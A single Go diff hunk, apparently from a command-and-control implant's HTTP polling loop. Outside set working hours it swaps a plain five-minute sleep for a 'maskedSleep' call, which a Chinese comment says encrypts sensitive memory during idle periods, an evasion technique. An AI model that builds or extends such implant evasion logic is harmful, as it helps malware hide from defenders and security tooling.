@@ -317,7 +317,8 @@ func httpPollRun() {
 			os.Exit(0)
 		}
 		if workHoursValid && !inWorkingHours() {
-			time.Sleep(5 * time.Minute)
+			// 非工作时段：最长的一个空闲窗口，加密敏感内存后再睡（见 sleepmask_*.go）
+			maskedSleep(5 * time.Minute)
 			continue
 		}
 
